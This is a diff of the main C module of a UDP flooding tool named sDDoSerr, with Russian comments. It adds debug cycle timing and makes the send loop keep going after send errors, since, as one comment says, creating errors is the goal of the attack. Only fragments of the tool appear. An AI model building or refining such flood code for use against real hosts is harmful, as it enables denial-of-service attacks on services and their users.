@@ -3,7 +3,7 @@
   * 
   * Основной модуль программы.
   * 
-  * v.1.2.1.14a от 31.03.19.
+  * v.1.2.1.16a от 10.04.19.
   * !Не забывать изменять *argp_program_version 
   * под новую версию в парсере!
   **/
@@ -78,9 +78,9 @@ sDDoSerr Copyright © 2019 Константин Панков
 #include <unistd.h>
 #include <fcntl.h>
 
-//Массив для обычного времени.
+/* Массив для обычного времени. */
 char current_time [32];
-//Ф-я получения обычного времени.
+/* Ф-я получения обычного времени. */
 int get_current_time ()
 {        
     time_t time_now = time(NULL);
@@ -260,6 +260,11 @@ int main (int argc, char *argv[])
                 break;
             }
     
+    if (settings.debug == 2)
+            {                
+                start_time = get_time();
+            }
+    
     //! Для ф-ции nanosleep() - пауза между отправками "пачек".
     /* Структура с настройками паузы перед повтором отправки "пачки". */
     //Оставлена внутри цикла, т.к. это время должно изменяться.
@@ -366,7 +371,15 @@ int main (int argc, char *argv[])
         //int udp_send = udp_sender (udp_socket, message_struct);
         int udp_send;
         if (udp_send = udp_sender (udp_socket, message_struct) != 0)
-            {               
+            {   
+                //Если при отправке сообщения что-то пошло не так.
+                printf("Ошибка отправки пакета. \n");
+                fprintf(log, "%s\n", "Ошибка отправки пакета. \n");
+                
+                /*            
+                 * Не нужно выходить из программы при ошибке отправки,
+                 * т.к. создание ошибок - цель атаки. :)
+                 * 
                 //Если при отправке сообщения что-то пошло не так.
                 printf("Упс. При отправке пакета что-то пошло не так."\
                 "\n");
@@ -383,6 +396,8 @@ int main (int argc, char *argv[])
                 fclose(log);
                 
                 exit(EXIT_FAILURE);
+                
+                */
             }
         
         
@@ -408,13 +423,23 @@ int main (int argc, char *argv[])
         {
             printf("Ошибка вызова nano sleep. \n");
             return 1;
+            /*
+             * Тоже не надо выходить из цикла при ошибке.
             break;
+            */ 
         }
         
         //Для дебага.
         if (settings.debug >= 1)
             {
                 cycle_counter++;
+            }
+        
+        if (settings.debug == 2)
+            {                
+                end_time = get_time();
+                elapsed_time = end_time - start_time;
+                printf("Время полного цикла: %lli мс.\n", elapsed_time);
             }
     
     }
